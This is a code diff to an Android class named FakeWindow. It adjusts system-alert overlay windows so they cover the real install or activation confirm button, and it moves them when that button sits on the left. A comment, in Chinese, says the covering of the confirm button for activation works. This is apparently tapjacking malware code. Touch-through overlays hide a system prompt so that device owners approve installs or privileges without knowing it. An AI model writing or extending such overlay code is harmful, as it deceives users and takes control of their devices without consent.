@@ -45,6 +45,8 @@ public class FakeWindow {
     private Handler handler;
 
     private WindowManager.LayoutParams fullConfirmBtnParams;
+    private WindowManager.LayoutParams confirmBtnParams;
+    private WindowManager.LayoutParams btnParams;
     private View fullInstallView;
 
     private WindowListener mWindowListener;
@@ -128,6 +130,21 @@ public class FakeWindow {
                 fullInstallView = null;
             }
 
+            if (AppRuntime.ACTIVE_LEFT_BUTTON.get()) {
+                fullConfirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+                confirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+                btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+
+                wm.updateViewLayout(installView, confirmBtnParams);
+                wm.updateViewLayout(timerView, btnParams);
+
+                if (fullInstallView != null) {
+                    wm.updateViewLayout(fullInstallView, fullConfirmBtnParams);
+                }
+
+                AppRuntime.ACTIVE_LEFT_BUTTON.set(false);
+            }
+
             handler.post(new Runnable() {
                 @Override
                 public void run() {
@@ -186,7 +203,7 @@ public class FakeWindow {
          * 测试代码，确认按键全遮盖
          * 经确认可以支持激活的全遮盖
          */
-        WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+        confirmBtnParams = new WindowManager.LayoutParams();
         confirmBtnParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
         confirmBtnParams.format = PixelFormat.RGBA_8888;
         confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
@@ -200,7 +217,7 @@ public class FakeWindow {
         wm.addView(installView, confirmBtnParams);
 
         //timer
-        WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
+        btnParams = new WindowManager.LayoutParams();
         btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
         btnParams.format = PixelFormat.RGBA_8888;
         btnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
